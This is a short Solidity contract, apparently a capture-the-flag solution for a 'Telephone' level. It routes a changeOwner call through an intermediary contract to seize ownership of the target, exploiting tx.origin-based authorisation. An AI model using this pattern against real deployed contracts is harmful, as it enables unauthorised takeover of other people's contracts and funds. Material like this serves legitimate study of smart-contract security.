// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface ILevel {
    function changeOwner(address _owner) external;
}

contract TelephoneRun {    
    function run(address _levelAddress) external {     
        ILevel(_levelAddress).changeOwner(msg.sender);
    }
}